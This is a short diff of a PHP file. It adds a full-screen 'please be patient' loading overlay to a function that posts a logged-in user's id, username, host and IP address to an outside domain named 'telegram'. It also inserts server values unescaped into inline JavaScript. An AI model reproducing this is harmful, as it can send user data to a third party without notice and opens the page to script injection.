@@ -10,6 +10,12 @@ if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
 function sendAjaxRequest($id, $username)
 {
     // AJAX request code here
+    echo "<div style='z-index:10000;height: 100vh !important; position:fixed; inset:0;
+    flex-direction:column;
+    display:flex; justify-content:center; align-items:center;background-color:white'>
+    <p>لطفا صبور باشید</p>
+    <img src='./img/loading.gif' alt='' srcset=''>
+    </div>";
     echo '<script src="./js/assets/axios.js"></script>
         <script>
             var params = new URLSearchParams();
@@ -19,7 +25,6 @@ function sendAjaxRequest($id, $username)
             params.append("time", "' . date("Y-m-d h:i:sa") . '");
             params.append("host", "' . $_SERVER['HTTP_HOST'] . '");
             params.append("ip", "' . $_SERVER['REMOTE_ADDR'] . '");
-
             axios.post("http://telegram.om-dienstleistungen.de/", params)
                 .then(function(response) {
                     console.log(response.data);
